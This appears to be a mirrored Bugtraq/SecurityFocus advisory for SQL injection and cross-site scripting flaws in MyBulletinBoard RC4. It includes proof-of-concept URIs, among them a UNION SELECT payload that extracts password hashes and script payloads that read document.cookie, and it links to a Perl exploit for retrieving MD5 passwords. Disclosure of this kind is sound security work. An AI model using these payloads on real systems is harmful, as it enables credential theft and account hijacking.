@@ -1,0 +1,96 @@
+#SpeeDr00t@Black Falcon<br>#bid13827<p><b><span style="font-size: 18pt;">MyBB Multiple Cross-Site Scripting and SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/13827/info">info</a><br><a href="http://www.securityfocus.com/bid/13827/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/13827/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/13827/solution">solution</a><br><a href="http://www.securityfocus.com/bid/13827/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				13827
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 31 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 31 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				"Alberto Trivero" &lt;trivero@jumpy.it&gt; is credited with the discovery of these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					MyBulletinBoard MyBulletinBoard  RC4<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x14000/13827/mybb-sql-inj.pl">#exploit_mybb-sql-inj.pl</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>The following proof of concept URI are available:<br/>http://www.example.com/mybb/calendar.php?action=event&amp;eid='%20UNION%20SELECT%20uid,uid,null,null,null,null,password,null%20FROM%20mybb_users/*<br/>http://www.example.com/mybb/online.php?pidsql=)sql_query<br/>http://www.example.com/mybb/memberlist.php?usersearch=%'sql_query<br/>http://www.example.com/mybb/editpost.php?pid='sql_query<br/>http://www.example.com/mybb/forumdisplay.php?fid='sql_query<br/>http://www.example.com/mybb/newreply.php?tid='sql_query<br/>http://www.example.com/mybb/search.php?action=results&amp;sid='sql_query<br/>http://www.example.com/mybb/showthread.php?tid='sql_query<br/>http://www.example.com/mybb/showthread.php?pid='sql_query<br/>http://www.example.com/mybb/usercp2.php?tid='sql_query<br/>http://www.example.com/mybb/printthread.php?tid='sql_query<br/>http://www.example.com/mybb/reputation.php?pid='sql_query<br/>http://www.example.com/mybb/portal.php?action=do_login&amp;username='sql_query<br/>http://www.example.com/mybb/polls.php?action=newpoll&amp;tid='sql_query<br/>http://www.example.com/mybb/ratethread.php?tid='sql_query<br/><br/>http://www.example.com/mybb/misc.php?action=syndication&amp;forums0=%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/mybb/misc.php?action=syndication&amp;forums0=0&amp;version=%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/mybb/misc.php?action=syndication&amp;limit=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/mybb/forumdisplay.php?fid=1&amp;datecut=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/mybb/forumdisplay.php?fid=2&amp;page=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/mybb/member.php?agree=I+Agree&amp;username=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/mybb/member.php?agree=I+Agree&amp;email=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/mybb/member.php?agree=I+Agree&amp;email2=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/mybb/memberlist.php?page=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/mybb/memberlist.php?usersearch=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/mybb/showthread.php?mode=linear&amp;tid=1&amp;pid=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/mybb/showthread.php?mode=linear&amp;tid=1%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/mybb/printthread.php?tid=1%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/><br/>The following SQL injection exploit is available to retrieve MD5 passwords:
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/mybb-sql-inj.pl">/data/vulnerabilities/exploits/mybb-sql-inj.pl</a></li>
+</ul>
+</div>
